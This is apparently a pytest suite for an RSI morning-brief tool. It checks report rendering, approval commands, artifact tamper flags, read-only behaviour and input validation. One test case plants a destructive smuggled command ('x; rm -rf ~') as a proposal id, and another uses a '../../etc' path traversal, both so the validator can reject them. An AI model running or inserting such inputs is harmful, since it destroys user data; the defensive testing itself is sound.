"""Mission 005 Part E: the RSI morning brief (`amem rsi brief`, rsi_brief.py; docs/rsi/m005-plan.md 2.5 and 2.6).

Synthetic `rsi-night/1` reports (contract 2.5) in a temp RSI_SANDBOX_DIR, staged artifacts written the way
`improve stage` writes them, and rows in the throwaway Postgres (`pg_url`). Covers: every section, each night
status, the proposal block (diff summary, evidence, baseline vs candidate, hash, the Apply / Reject / Details
commands), pending decisions from earlier nights, a database outage, report validation, read-only behaviour,
untrusted text, and the phone push: refused without the opt-in (nothing sent; the HTTP layer and the macOS
notifier are replaced in every test) and scrubbed of planted sensitive markers when opted in.
"""

from __future__ import annotations

import json
import urllib.request
import uuid
from datetime import timedelta
from pathlib import Path
from typing import Any

import psycopg
import pytest

from agent_memory import cli, daily, rsi_approval as AP, rsi_artifact as RA, rsi_brief as BR
from conftest import base_env, run_amem

NIGHT = "2026-10-18"
CLOSED_DB = "postgresql://postgres:postgres@127.0.0.1:1/postgres"   # nothing listens: connection refused
BEFORE = b"# Global\n\n## Closing line\n\n- End with a short summary.\n"
AFTER = b"# Global\n\n## Closing line\n\n- End with a section that lists the tools you used.\n"
TOP_KEYS = {"format", "night", "status", "generated_at", "report", "started_at", "finished_at", "checkpoint", "headline",
            "summary", "notes", "sessions", "patterns", "candidates", "experiments", "passed", "failed", "costs", "health",
            "pending_decisions", "sections", "skipped", "prerequisite_warnings"}
BLOCK_KEYS = {"experiment_id", "candidate_key", "proposal_id", "title", "what", "target", "change", "why", "evidence_refs",
              "baseline_vs_candidate", "evaluation", "risk", "confidence", "artifact_hash", "proposal_status", "expires_at",
              "cost_usd", "actions", "apply_blocked", "warnings"}
# What a sandbox-replay record holds after an independent evaluation (G2b: Codex judge, live Jev)
LIVE_RESULTS = {"agent": "claude", "judge": {"mode": "codex", "judged": 3, "wins_a": 1, "wins_b": 2, "ties": 0,
                                             "unfired_b": 0, "errors": 0, "b_winrate": 0.6667},
                "jev": {"mode": "live", "status": "ok", "effect": "improves", "confidence": 0.76,
                        "harness_problem": 0.06, "evidence_strength": 0.64, "error": None}}
STUB_RESULTS = {"agent": "stub", "judge": {**LIVE_RESULTS["judge"], "mode": "stub"},
                "jev": {**LIVE_RESULTS["jev"], "mode": "fixture"}}


@pytest.fixture(autouse=True)
def sandbox(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
    root = tmp_path / "sandbox"
    root.mkdir()
    monkeypatch.setenv("RSI_SANDBOX_DIR", str(root))
    monkeypatch.delenv("RSI_ARTIFACTS_DIR", raising=False)
    monkeypatch.setenv("AMEM_AGENT_CONFIG_DIR", str(tmp_path / "no-agent-config"))   # required suites: the defaults
    return root


@pytest.fixture(autouse=True)
def sent(monkeypatch: pytest.MonkeyPatch) -> list[tuple[Any, ...]]:
    """Every way out is replaced: the ntfy POST, the macOS notifier and urllib itself."""
    calls: list[tuple[Any, ...]] = []

    def http_post(url: str, body: bytes, headers: dict[str, str]) -> int:
        calls.append(("http", url, body))
        return 200

    def urlopen(*a: Any, **k: Any) -> Any:
        calls.append(("urlopen",))
        raise AssertionError("network attempted in a brief test")

    monkeypatch.setattr(daily, "http_post", http_post)
    monkeypatch.setattr(daily, "mac_notify", lambda title, body: calls.append(("mac", title, body)))
    monkeypatch.setattr(urllib.request, "urlopen", urlopen)
    return calls


@pytest.fixture
def rdb(pg_url: str, monkeypatch: pytest.MonkeyPatch) -> str:
    with psycopg.connect(pg_url) as conn:
        conn.execute("set session_replication_role = replica")   # superuser-only: skips the append-only triggers
        for t in ("rsi_decision_results", "rsi_decisions", "rsi_decision_tokens", "rsi_eval_results", "rsi_proposals",
                  "rsi_artifacts", "rsi_candidates", "rsi_evidence", "rsi_checkpoints", "rsi_experiments"):
            conn.execute(f"delete from {t}")
    monkeypatch.setenv("AMEM_DB_URL", pg_url)
    return pg_url


# --------------------------------------------------------------------------- synthetic inputs


def make_artifact(root: Path, files: list[tuple[str, bytes, bytes]], *, exp: str, baseline: str = "bl-000000000001",
                  evals: dict[str, str] | None = None, results: dict[str, Any] | None = None) -> tuple[str, Path]:
    """The same bytes improve stage writes (agent-config lib/rsi_artifact.py), plus eval records. The
    sandbox-replay record's results: `results` (default LIVE_RESULTS, an independent evaluation)."""
    entries = sorted(({"path": k, "kind": "instruction", "rule_id": "claude-md-global--closing-line", "mode": "0644",
                       "before_sha256": RA.sha256_bytes(b), "after_sha256": RA.sha256_bytes(a)} for k, b, a in files),
                     key=lambda f: f["path"])
    m = {"format": RA.ARTIFACT_FORMAT, "experiment_id": exp, "baseline_id": baseline, "proposal_kind": "edit_instruction",
         "activation": "none", "files": entries}
    h = RA.artifact_hash(m)
    d = root / "artifacts" / h
    for sub in ("files", "before", "evals"):
        (d / sub).mkdir(parents=True)
    (d / "manifest.json").write_bytes(RA.canonical(m) + b"\n")
    for _, b, a in files:
        (d / "files" / RA.sha256_bytes(a)).write_bytes(a)
        (d / "before" / RA.sha256_bytes(b)).write_bytes(b)
    for suite, verdict in (evals or {"static": "pass", "sandbox-replay": "improves"}).items():
        rec = {"format": RA.EVAL_FORMAT, "artifact_hash": h, "experiment_id": exp, "baseline_id": baseline, "suite": suite,
               "suite_version": "1", "model": "stub", "effort": "none", "verdict": verdict,
               "started_at": "2026-10-18T01:10:00+00:00", "finished_at": "2026-10-18T01:20:00+00:00", "runner": "test",
               "results": (LIVE_RESULTS if results is None else results) if suite == "sandbox-replay" else {}}
        (d / "evals" / f"{suite}.json").write_bytes(RA.canonical(rec) + b"\n")
    return h, d


def stage(url: str, root: Path, exp: str, *, night: str = NIGHT, before: bytes = BEFORE, after: bytes = AFTER,
          title: str = "Closing line as a required section", evals: dict[str, str] | None = None,
          ttl: timedelta = AP.TOKEN_TTL, results: dict[str, Any] | None = None, **kw: Any) -> tuple[str, str]:
    """An experiment row, a staged artifact and its proposal (rsi_approval.create_proposal). (hash, proposal id)."""
    h, d = make_artifact(root, [("~/.claude/CLAUDE.md", before, after)], exp=exp, evals=evals, results=results)
    with psycopg.connect(url) as conn:
        conn.execute("insert into rsi_experiments (id, night, kind, status, verdict) values (%s, %s, 'edit_instruction', "
                     "'evaluated', 'IMPROVES')", (exp, night))
        pid = AP.create_proposal(conn, d, title=title, summary=kw.pop("summary", "Make the closing line a contract."),
                                 rationale=kw.pop("rationale", {"why": "8 deviations", "tests": "sandbox-replay"}),
                                 evidence_refs=kw.pop("evidence_refs", ["amem:deviation/3"]), risk={"level": "low"},
                                 confidence=0.7, expected={"effect": "fewer deviations"}, ttl=ttl, **kw)
    return h, pid


def experiment(eid: str | None, status: str, verdict: str | None, *, h: str | None = None, pid: str | None = None,
               **over: Any) -> dict[str, Any]:
    e = {"experiment_id": eid, "candidate_key": "dev:claude-md:global/closing-line",
         "hypothesis": {"what": "Make the closing line a required section", "why": "8 deviations in 5 sessions"},
         "target": "~/.claude/CLAUDE.md", "artifact_hash": h, "baseline_id": "bl-000000000001", "verdict": verdict,
         "verdict_reasons": ["pass rate 0.50 -> 0.90 (n=10)"],
         "arms": {"A": {"pass_rate": 0.5, "n": 10, "tool_calls": 31, "errors": 0},
                  "B": {"pass_rate": 0.9, "n": 10, "tool_calls": 28, "errors": 0}},
         "risk": "low", "confidence": 0.8, "cost_usd": 0.12, "status": status, "proposal_id": pid,
         "evidence_refs": ["amem:deviation/1", "langfuse:trace/abc"]}
    e.update(over)
    return e


def night_report(**over: Any) -> dict[str, Any]:
    """Exactly the keys of contract 2.5."""
    rep = {"format": "rsi-night/1", "night": NIGHT, "started_at": "2026-10-18T01:00:00+00:00",
           "finished_at": "2026-10-18T01:42:00+00:00", "status": "ok",
           "checkpoint": {"before": "2026-10-17T03:00:00+00:00", "after": "2026-10-18T03:00:00+00:00", "advanced": True},
           "delta": {"since": "2026-10-17T03:00:00+00:00", "sessions": 42, "deviations": 7, "eval_failures": 2,
                     "routine_failures": 1},
           "patterns": [{"key": "closing-line", "summary": "Closing line missing after long tasks", "n": 8, "sessions": 5,
                         "refs": ["amem:deviation/1", "amem:deviation/2"]}],
           "candidates": [{"id": str(uuid.uuid4()), "key": "dev:claude-md:global/closing-line", "source": "deviations",
                           "rank": 0.82, "selected": True, "reason": "recurring and testable"},
                          {"id": str(uuid.uuid4()), "key": "dev:skill:dispatch/brief", "source": "deviations",
                           "rank": 0.41, "selected": False, "reason": "low recurrence"}],
           "experiments": [],
           "costs": {"by_model": {"claude-opus-4-1": {"calls": 2, "tokens_in": 12000, "tokens_out": 3000, "usd": 0.31},
                                  "jev-1.14.0": {"calls": 5, "tokens_in": 4000, "tokens_out": 500, "usd": 0.11}},
                     "sandbox_runs": 4, "providers": {"clickhouse": {"requests": 3, "usd": 0.0},
                                                      "langfuse": {"requests": 2, "usd": 0.0}},
                     "total_usd": 0.42},
           "health": {"supabase": "ok", "clickhouse": "ok", "langfuse": "ok", "pastdev": "ok", "jev": "fixture",
                      "sandbox": "ok"},
           "pending_decisions": []}
    rep.update(over)
    return rep


def write_report(root: Path, rep: Any, night: str = NIGHT) -> Path:
    p = root / "nights" / night / "report.json"
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(rep if isinstance(rep, str) else json.dumps(rep))
    return p


def sections_once(md: str) -> None:
    for s in BR.SECTIONS:
        assert md.count(f"\n## {s}\n") == 1, s


# --------------------------------------------------------------------------- the full brief


def test_full_brief_has_every_section_and_a_complete_proposal_block(rdb: str, sandbox: Path) -> None:
    h, pid = stage(rdb, sandbox, "exp-20261018-01")
    with psycopg.connect(rdb) as conn:
        cid = AP.upsert_candidate(conn, dedupe_key="dev:claude-md:global/closing-line", source="deviations",
                                  kind="edit_instruction")
        conn.execute("update rsi_candidates set status = 'tested' where id = %s", (cid,))
        AP.upsert_candidate(conn, dedupe_key="dev:other/backlog", source="deviations", kind="edit_instruction")
    rep = night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h, pid=pid),
                                    experiment("exp-20261018-02", "not_promotable", "NO_EFFECT", h="a" * 64,
                                               verdict_reasons=["pass rate 0.50 -> 0.52 (n=10), below threshold"]),
                                    experiment("exp-20261018-03", "failed", None, verdict_reasons=["sandbox error"])],
                       pending_decisions=[pid])
    rep["candidates"][0]["id"] = cid
    write_report(sandbox, rep)
    b = BR.make_brief(root=sandbox, db_url=rdb)
    md = BR.render_markdown(b)
    sections_once(md)
    assert md.startswith(f"# RSI morning brief: night {NIGHT}\n")
    assert "1 improvement ready to apply, 2 failed or inconclusive, 1 decision waiting for you. Total cost $0.42." in md
    assert "Checkpoint advanced: 2026-10-17T03:00:00+00:00 -> 2026-10-18T03:00:00+00:00." in md
    assert "- 42 new or changed sessions since 2026-10-17T03:00:00+00:00." in md
    assert "- 7 deviations, 2 eval failures, 1 routine failure." in md
    assert "**closing-line** (n=8, 5 sessions): Closing line missing after long tasks" in md

    (blk,) = b["passed"]
    assert set(blk) == BLOCK_KEYS and blk["warnings"] == []
    assert blk["artifact_hash"] == h and blk["proposal_id"] == pid and blk["proposal_status"] == "staged"
    assert blk["actions"] == {"apply": f"amem rsi decide {pid} apply --hash {h}",
                              "reject": f"amem rsi decide {pid} reject --hash {h}", "details": f"amem rsi show {pid}"}
    ch = blk["change"]
    assert ch["verified"] and ch["matches_db"] is True and ch["dir"] == f"artifacts/{h}"
    (f,) = ch["files"]
    assert (f["path"], f["added"], f["removed"]) == ("~/.claude/CLAUDE.md", 1, 1)
    assert f["excerpt"] == ["-- End with a short summary.", "+- End with a section that lists the tools you used."]
    assert blk["what"] == "Make the closing line a required section" and blk["why"] == "8 deviations in 5 sessions"
    assert blk["evidence_refs"] == ["amem:deviation/1", "langfuse:trace/abc", "amem:deviation/3"]
    bvc = blk["baseline_vs_candidate"]
    assert {m["name"]: (m["baseline"], m["candidate"], m["delta"]) for m in bvc["metrics"]}["pass_rate"] == (0.5, 0.9, 0.4)
    assert {(e["suite"], e["verdict"]) for e in bvc["evals"]} == {("static", "pass"), ("sandbox-replay", "improves")}
    assert bvc["evals_from"] == "database" and blk["risk"] == "low" and blk["confidence"] == 0.8

    for line in (f"### 1. Closing line as a required section", "**What would change:** Make the closing line a required section",
                 "~/.claude/CLAUDE.md (instruction, rule claude-md-global--closing-line): +1 -1 lines.",
                 "    +- End with a section that lists the tools you used.", "**Why:** 8 deviations in 5 sessions",
                 "**Supporting evidence:** `amem:deviation/1`, `langfuse:trace/abc`, `amem:deviation/3`",
                 "verdict IMPROVES (pass rate 0.50 -> 0.90 (n=10))", "| pass_rate | 0.5 | 0.9 | +0.4 |",
                 "| tool_calls | 31 | 28 | -3 |", "Evaluations (database): sandbox-replay improves, static pass.",
                 "**Risk and confidence:** risk low, confidence 0.80.",
                 f"**Artifact hash:** `{h}` (verified, matches the database copy; artifacts/{h}).",
                 f"**Apply:** `amem rsi decide {pid} apply --hash {h}`", f"**Reject:** `amem rsi decide {pid} reject --hash {h}`",
                 f"**Details:** `amem rsi show {pid}`"):
        assert line in md, line

    assert [(x["experiment_id"], x["verdict"], x["status"]) for x in b["failed"]] == [
        ("exp-20261018-02", "NO_EFFECT", "not_promotable"), ("exp-20261018-03", None, "failed")]
    assert "exp-20261018-02 (dev:claude-md:global/closing-line): NO_EFFECT, not promotable. Only IMPROVES can be staged." in md
    assert "exp-20261018-03 (dev:claude-md:global/closing-line): no verdict, failed. The experiment failed before" in md
    assert "| claude-opus-4-1 | 2 | 12000 | 3000 | $0.31 |" in md and "- Total: $0.42." in md
    assert "Providers: clickhouse 3 requests ($0.00), langfuse 2 requests ($0.00)." in md
    assert "- jev: fixture\n" in md and "Database rows for this brief: ok." in md and "DEGRADED" not in md
    cand = b["candidates"]
    assert (cand["total"], cand["selected"], cand["backlog"]) == (2, 1, 1)
    assert cand["items"][0]["status"] == "tested" and cand["items"][0]["seen_count"] == 1
    assert "2 considered, 1 selected for an experiment. Backlog: 1 candidate kept for future nights." in md
    (item,) = b["pending_decisions"]["items"]
    assert item["proposal_id"] == pid and item["this_night"] and item["night"] == NIGHT and item["files"] == ["CLAUDE.md"]
    assert f"**Closing line as a required section** (night {NIGHT}, this night, risk low, confidence 0.70" in md


def test_json_output_schema_and_cli(rdb: str, sandbox: Path) -> None:
    h, pid = stage(rdb, sandbox, "exp-20261018-01")
    write_report(sandbox, night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h, pid=pid)],
                                       pending_decisions=[pid]))
    env = base_env(AMEM_DB_URL=rdb, AMEM_AGENT_CONFIG_DIR=str(sandbox / "no-agent-config"))
    r = run_amem("rsi", "brief", "--json", "--root", str(sandbox), env=env)
    assert r.returncode == 0, r.stderr
    out = json.loads(r.stdout)
    assert set(out) == TOP_KEYS and out["format"] == "rsi-brief/1" and out["sections"] == list(BR.SECTIONS)
    assert out["report"]["path"] == f"nights/{NIGHT}/report.json" and len(out["report"]["sha256"]) == 64
    assert set(out["sessions"]) == {"since", "sessions", "deviations", "eval_failures", "routine_failures"}
    for k in ("patterns", "experiments"):
        assert set(out[k]) == {"total", "items"}
    assert set(out["candidates"]) == {"total", "selected", "backlog", "items"}
    assert set(out["costs"]) == {"by_model", "sandbox_runs", "providers", "total_usd", "budget_exhausted", "by_basis",
                                 "reported_usd", "estimated_usd"}
    assert set(out["health"]) == {"services", "degraded", "database", "warnings", "reasons"}
    assert set(out["pending_decisions"]) == {"total", "items", "no_longer_pending", "with_apply"}
    assert set(out["pending_decisions"]["items"][0]) == {"proposal_id", "title", "night", "this_night", "status", "created_at",
                                                         "expires_at", "artifact_hash", "risk", "confidence", "files", "actions",
                                                         "evidence_refs", "judgments", "apply_blocked"}
    assert out["pending_decisions"]["with_apply"] == 1 and out["pending_decisions"]["items"][0]["apply_blocked"] == []
    (blk,) = out["passed"]
    assert set(blk) == BLOCK_KEYS and set(blk["actions"]) == {"apply", "reject", "details"}
    assert set(blk["change"]) == {"dir", "verified", "error", "matches_db", "files"}
    assert set(blk["baseline_vs_candidate"]) == {"verdict", "verdict_reasons", "metrics", "evals", "evals_from", "required_suites"}
    inproc = json.loads(json.dumps(BR.make_brief(root=sandbox, db_url=rdb), sort_keys=True, default=str))
    for d in (out, inproc):
        d.pop("generated_at")
    assert out == inproc                                                  # the CLI prints exactly the library's brief
    r = run_amem("rsi", "brief", "--root", str(sandbox), "--night", NIGHT, env=env)
    assert r.returncode == 0 and r.stdout.startswith(f"# RSI morning brief: night {NIGHT}"), r.stderr


# --------------------------------------------------------------------------- night variants


VARIANTS: dict[str, tuple[dict[str, Any], list[str]]] = {
    "empty": ({"delta": {"since": "2026-10-17T03:00:00+00:00", "sessions": 0, "deviations": 0, "eval_failures": 0,
                         "routine_failures": 0},
               "patterns": [], "candidates": [], "experiments": [],
               "costs": {"by_model": {}, "sandbox_runs": 0, "providers": {}, "total_usd": 0.0}},
              ["The night finished.", "- No new sessions since 2026-10-17T03:00:00+00:00.", "- None found.",
               "0 considered, 0 selected", "- None ran.", "- None this night.", "- No model calls.",
               "- Nothing waits for you.", "0 improvements ready to apply, 0 failed or inconclusive, 0 decisions waiting"]),
    "all_failed": ({"experiments": [experiment("exp-20261018-01", "not_promotable", "NO_EFFECT", h="a" * 64),
                                    experiment("exp-20261018-02", "not_promotable", "WORSE", h="b" * 64),
                                    experiment("exp-20261018-03", "not_promotable", "INCONCLUSIVE", h="c" * 64,
                                               verdict_reasons=["stale-baseline"])]},
                   ["- None this night.", "NO_EFFECT, not promotable", "WORSE, not promotable",
                    "INCONCLUSIVE, not promotable. Only IMPROVES can be staged. Reasons: stale-baseline."]),
    "aborted": ({"status": "aborted", "checkpoint": {"before": "2026-10-17T03:00:00+00:00", "after": None, "advanced": False},
                 "experiments": [experiment("exp-20261018-01", "interrupted", None, h="a" * 64)]},
                ["The night was aborted", "Checkpoint not advanced (stays at 2026-10-17T03:00:00+00:00)",
                 "no verdict, interrupted. Interrupted when the night was aborted; nothing was staged."]),
    "budget_exhausted": ({"status": "budget_exhausted", "notes": ["budget: max_experiments reached"],
                          "experiments": [experiment("exp-20261018-01", "failed", None),
                                          experiment(None, "skipped_budget", None, arms={}, cost_usd=None)]},
                         ["The night stopped early: the budget ran out", "- Note: budget: max_experiments reached",
                          "(not started) (dev:claude-md:global/closing-line): no verdict, skipped budget. Skipped: the budget",
                          "The budget ran out: the night stopped at this total."]),
    "preflight_failed": ({"status": "preflight_failed", "notes": ["preflight: sandbox unavailable"],
                          "checkpoint": {"before": None, "after": None, "advanced": False},
                          "delta": {"since": None, "sessions": 0, "deviations": 0, "eval_failures": 0, "routine_failures": 0},
                          "patterns": [], "candidates": [], "experiments": [],
                          "costs": {"by_model": {}, "sandbox_runs": 0, "providers": {}, "total_usd": 0.0},
                          "health": {"supabase": "ok", "clickhouse": "skipped", "langfuse": "skipped", "pastdev": "skipped",
                                     "jev": "fixture", "sandbox": "unavailable"}},
                         ["The night did not run: preflight failed", "Checkpoint not advanced (stays at start)",
                          "- sandbox: unavailable (DEGRADED)", "- clickhouse: skipped\n", "- No new sessions."]),
    "partial": ({"status": "partial", "health": {"supabase": "ok", "clickhouse": "ok", "langfuse": "error", "pastdev": "ok",
                                                 "jev": "fixture", "sandbox": "ok"}},
                ["The night finished in part", "- langfuse: error (DEGRADED)"]),
}


@pytest.mark.parametrize("variant", sorted(VARIANTS))
def test_night_variants_render_every_section(variant: str, rdb: str, sandbox: Path) -> None:
    over, expect = VARIANTS[variant]
    write_report(sandbox, night_report(**json.loads(json.dumps(over))))
    b = BR.make_brief(root=sandbox, db_url=rdb)
    md = BR.render_markdown(b)
    sections_once(md)
    for s in expect:
        assert s in md, (variant, s)
    assert b["status"] == night_report(**over)["status"] and json.loads(json.dumps(b, default=str))["format"] == BR.BRIEF_FORMAT
    if variant in ("all_failed", "aborted", "budget_exhausted"):
        assert b["passed"] == [] and len(b["failed"]) == len(over["experiments"])


def test_provider_outages_show_in_health_and_in_the_phone_summary(sandbox: Path) -> None:
    write_report(sandbox, night_report(health={"supabase": "ok", "clickhouse": "unavailable", "langfuse": "error",
                                               "pastdev": "skipped", "jev": "live", "sandbox": "fixture-missing"}))
    b = BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    assert b["health"]["degraded"] == ["clickhouse", "langfuse", "sandbox"]
    md = BR.render_markdown(b)
    for line in ("- clickhouse: unavailable (DEGRADED)", "- langfuse: error (DEGRADED)", "- pastdev: skipped\n",
                 "- jev: live\n", "- sandbox: fixture-missing (DEGRADED)"):
        assert line in md, line
    _, body = BR.notification(b)
    assert "Degraded: clickhouse unavailable, langfuse error, sandbox fixture-missing." in body


# --------------------------------------------------------------------------- pending decisions, database


def test_pending_decisions_include_earlier_nights(rdb: str, sandbox: Path) -> None:
    ha, a = stage(rdb, sandbox, "exp-20261016-01", night="2026-10-16", after=b"a1\n", title="Earlier A")
    _, bb = stage(rdb, sandbox, "exp-20261017-01", night="2026-10-17", after=b"b1\n", title="Earlier B")
    _, c = stage(rdb, sandbox, "exp-20261015-01", night="2026-10-15", after=b"c1\n", title="Expired C",
                 ttl=timedelta(seconds=-1))
    _, d = stage(rdb, sandbox, "exp-20261017-02", night="2026-10-17", after=b"d1\n", title="Rejected D")
    he, e = stage(rdb, sandbox, "exp-20261018-01", after=b"e1\n", title="Tonight E")
    with psycopg.connect(rdb) as conn:
        conn.execute("update rsi_proposals set status = 'rejected' where id = %s", (d,))
    write_report(sandbox, night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=he, pid=e)],
                                       pending_decisions=[e, d]))
    b = BR.make_brief(root=sandbox, db_url=rdb)
    pd = b["pending_decisions"]
    assert [(i["title"], i["night"], i["this_night"]) for i in pd["items"]] == [
        ("Earlier A", "2026-10-16", False), ("Earlier B", "2026-10-17", False), ("Tonight E", NIGHT, True)]
    assert c not in json.dumps(pd) and pd["no_longer_pending"] == [{"proposal_id": d, "status": "rejected"}]
    assert pd["items"][0]["actions"]["apply"] == f"amem rsi decide {a} apply --hash {ha}"
    md = BR.render_markdown(b)
    assert "3 decisions waiting for you" in md and f"- No longer pending: `{d}` is now rejected." in md
    assert "**Earlier B** (night 2026-10-17, risk low, confidence 0.70" in md and f"  - Details: `amem rsi show {bb}`" in md


def test_database_outage_still_renders_from_the_report(sandbox: Path) -> None:
    h, _ = make_artifact(sandbox, [("~/.claude/CLAUDE.md", BEFORE, AFTER)], exp="exp-20261018-01")
    pid = str(uuid.uuid4())
    write_report(sandbox, night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h, pid=pid)],
                                       pending_decisions=[pid]))
    b = BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    assert b["health"]["database"]["status"] == "unavailable"
    (blk,) = b["passed"]
    assert blk["change"]["verified"] and blk["change"]["matches_db"] is None
    assert blk["baseline_vs_candidate"]["evals_from"] == "artifact" and blk["warnings"] == []
    (item,) = b["pending_decisions"]["items"]
    # Mission 005.5: without the database the proposal cannot be confirmed, so no Apply (Reject and Details stay)
    assert item["actions"]["apply"] is None and blk["actions"]["apply"] is None
    assert item["actions"]["reject"] == f"amem rsi decide {pid} reject --hash {h}" and item["artifact_hash"] == h
    assert any("could not be confirmed in the database" in x for x in item["apply_blocked"])
    md = BR.render_markdown(b)
    sections_once(md)
    assert "- Database rows for this brief: unavailable (OperationalError)." in md
    assert "unknown (database rows not read)" in md
    _, body = BR.notification(b)
    assert "Database rows not read." in body


def test_artifact_problems_are_flagged_in_the_block(rdb: str, sandbox: Path) -> None:
    h1, p1 = stage(rdb, sandbox, "exp-20261018-01")
    h2, d2 = make_artifact(sandbox, [("~/.claude/CLAUDE.md", BEFORE, b"other bytes\n")], exp="exp-20261018-02")
    h3, p3 = stage(rdb, sandbox, "exp-20261018-03", after=b"three\n", evals={"static": "pass"})
    write_report(sandbox, night_report(experiments=[
        experiment("exp-20261018-01", "staged", "IMPROVES", h=h1, pid=p1),
        experiment("exp-20261018-02", "staged", "IMPROVES", h=h2, pid=p1),       # the row points at h1, not the tested h2
        experiment("exp-20261018-03", "staged", "IMPROVES", h=h3, pid=p3)], pending_decisions=[p1, p3]))
    (sandbox / "artifacts" / h1 / "files" / RA.sha256_bytes(AFTER)).write_bytes(AFTER + b"sneaked\n")
    b = BR.make_brief(root=sandbox, db_url=rdb)
    tampered, other, no_replay = b["passed"]
    assert not tampered["change"]["verified"] and "does not verify" in tampered["warnings"][0]
    assert any("points at another artifact" in w for w in other["warnings"])
    assert any("not registered in the database" in w for w in other["warnings"])
    assert other["actions"]["reject"] == f"amem rsi decide {p1} reject --hash {h2}"      # bound to the tested bytes
    for blk in (tampered, other, no_replay):                                               # Mission 005.5: no Apply
        assert blk["actions"]["apply"] is None and blk["apply_blocked"], blk["title"]
    assert "the artifact does not verify" in tampered["apply_blocked"]
    assert "the proposal points at another artifact" in other["apply_blocked"]
    assert "no sandbox-replay record is bound to this hash" in no_replay["apply_blocked"]
    assert no_replay["warnings"] == ["required evaluation(s) missing or not passing: sandbox-replay; promotion refuses it"]
    md = BR.render_markdown(b)
    assert f"`{h1}` (DOES NOT VERIFY;" in md and md.count("- **Warning:**") >= 4
    assert d2.is_dir()


def test_diff_summary_counts_lines_that_look_like_diff_headers() -> None:
    f = {"path": "~/.claude/CLAUDE.md", "kind": "instruction", "rule_id": "r"}
    ch = BR.file_change(f, b"# T\n---\nkeep\n@@ x\n", b"# T\n++x\nkeep\n@@ x\nnew `tick`\n")
    assert (ch["added"], ch["removed"]) == (2, 1)
    assert ch["excerpt"] == ["----", "+++x", "+new 'tick'"]
    new = BR.file_change(f, None, b"one\ntwo\n")
    assert (new["added"], new["removed"], new["before_bytes"]) == (2, 0, None) and "not in the artifact" in new["note"]


def test_brief_is_read_only(rdb: str, sandbox: Path) -> None:
    h, pid = stage(rdb, sandbox, "exp-20261018-01")
    write_report(sandbox, night_report(experiments=[experiment("exp-20261018-01", "staged", "IMPROVES", h=h, pid=pid)],
                                       pending_decisions=[pid]))

    def tree() -> dict[str, tuple[str, int]]:
        return {str(p.relative_to(sandbox)): (RA.sha256_bytes(p.read_bytes()), p.stat().st_mtime_ns)
                for p in sorted(sandbox.rglob("*")) if p.is_file()}

    def rows() -> list[Any]:
        with psycopg.connect(rdb) as conn:
            return [conn.execute(f"select count(*), md5(coalesce(string_agg(t::text, ',' order by t::text), '')) from {t} t")
                    .fetchone() for t in ("rsi_proposals", "rsi_decision_tokens", "rsi_decisions", "rsi_eval_results",
                                          "rsi_candidates", "rsi_experiments", "rsi_artifacts", "rsi_checkpoints")]

    before = (tree(), rows())
    BR.render_markdown(BR.make_brief(root=sandbox, db_url=rdb))
    env = base_env(AMEM_DB_URL=rdb, AMEM_AGENT_CONFIG_DIR=str(sandbox.parent / "no-agent-config"))
    assert run_amem("rsi", "brief", "--root", str(sandbox), env=env).returncode == 0
    assert (tree(), rows()) == before


# --------------------------------------------------------------------------- finding and validating the report


def test_latest_night_by_default_and_missing_reports(sandbox: Path) -> None:
    with pytest.raises(BR.ReportError, match="no night reports"):
        BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    for n in ("2026-10-16", "2026-10-17"):
        write_report(sandbox, night_report(night=n), night=n)
    (sandbox / "nights" / NIGHT).mkdir()                                    # the latest night left no report
    b = BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    assert b["night"] == "2026-10-17"
    assert b["health"]["warnings"] == [f"night {NIGHT} has no report.json (still running, or it stopped before writing one)"]
    assert f"- Warning: night {NIGHT} has no report.json" in BR.render_markdown(b)
    assert BR.make_brief(root=sandbox, night="2026-10-16", db_url=CLOSED_DB)["night"] == "2026-10-16"
    with pytest.raises(BR.ReportError, match=f"no report for night {NIGHT}"):
        BR.make_brief(root=sandbox, night=NIGHT, db_url=CLOSED_DB)
    with pytest.raises(BR.ReportError, match="bad night name"):
        BR.make_brief(root=sandbox, night="../../etc", db_url=CLOSED_DB)
    monkey_default = BR.make_brief(db_url=CLOSED_DB)                         # root: RSI_SANDBOX_DIR
    assert monkey_default["night"] == "2026-10-17"


def _staged_worse(r: dict[str, Any]) -> None:
    r["experiments"] = [experiment("exp-20261018-01", "staged", "WORSE", h="a" * 64, pid=str(uuid.uuid4()))]


INVALID: dict[str, tuple[Any, str]] = {
    "wrong format": (lambda r: r.update(format="rsi-night/2"), "format is 'rsi-night/2', expected 'rsi-night/1'"),
    "missing key": (lambda r: r.pop("experiments"), "experiments: missing or not a list"),
    "bad status": (lambda r: r.update(status="done"), "status 'done' is not one of"),
    "staged but WORSE": (_staged_worse, "staged needs verdict IMPROVES"),
    "pending id is a command": (lambda r: r.update(pending_decisions=["x; rm -rf ~"]), "pending_decisions[0]: not a proposal uuid"),
    "bad hash": (lambda r: r.update(experiments=[experiment("exp-20261018-01", "failed", None, h="abc")]),
                 "artifact_hash: not a sha256 hex digest"),
    "bad experiment id": (lambda r: r.update(experiments=[experiment("../x", "failed", None)]), "experiment_id: not an experiment id"),
    "night mismatch": (lambda r: r.update(night="2026-10-17"), "says night '2026-10-17'"),
    "health not strings": (lambda r: r["health"].update(sandbox=1), "health: values must be strings"),
    "negative count": (lambda r: r["delta"].update(sessions=-1), "delta.sessions: not a non-negative number"),
}


@pytest.mark.parametrize("case", sorted(INVALID))
def test_invalid_reports_fail_clearly(case: str, sandbox: Path) -> None:
    mutate, msg = INVALID[case]
    rep = night_report()
    mutate(rep)
    write_report(sandbox, rep)
    with pytest.raises(BR.ReportError) as exc:
        BR.make_brief(root=sandbox, db_url=CLOSED_DB)
    assert msg in str(exc.value)


def test_unreadable_reports_fail_clearly_in_the_cli(sandbox: Path) -> None:
    write_report(sandbox, "{not json")
    r = run_amem("rsi", "brief", "--root", str(sandbox), env=base_env())
    assert r.returncode == 1 and r.stdout == ""
    assert f"amem: rsi brief: nights/{NIGHT}/report.json is not valid JSON" in r.stderr
    write_report(sandbox, night_report(format="rsi-night/0"))
